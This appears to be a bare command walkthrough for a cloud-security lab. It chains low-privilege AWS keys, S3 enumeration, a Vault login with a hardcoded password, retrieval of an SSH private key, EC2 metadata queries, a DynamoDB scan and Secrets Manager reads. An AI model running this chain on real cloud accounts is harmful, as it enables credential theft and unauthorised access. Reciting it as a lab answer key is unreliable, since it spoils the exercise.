```
export AWS_ACCESS_KEY_ID=[low-priv-user]
export AWS_SECRET_ACCESS_KEY=[low-priv-user]
```

`aws s3 ls`

`aws s3 ls s3://[bucket]`

`aws s3 cp s3://[bucket]/nates_web_app_url.txt .`

`cat nates_web_app_url.txt`

`aws lambda list-functions`

`export VAULT_ADDR='http://[web_app_ip]:8200'`

`vault login TorysTotallyTubular456`

`vault kv get secret/id_rsa`

`echo "[id_rsa]" >> id_rsa`

`chmod 400 id_rsa`

`ssh -i id_rsa ec2-user@[web_app_ip]`

`TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")`

`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info`

`aws dynamodb list-tables`

`aws dynamodb scan --table-name [table]`

```
export AWS_ACCESS_KEY_ID=[secrets-manager-user]
export AWS_SECRET_ACCESS_KEY=[secrets-manager-user]
```

`aws secretsmanager list-secrets`

`aws secretsmanager get-secret-value --secret-id [secret]`
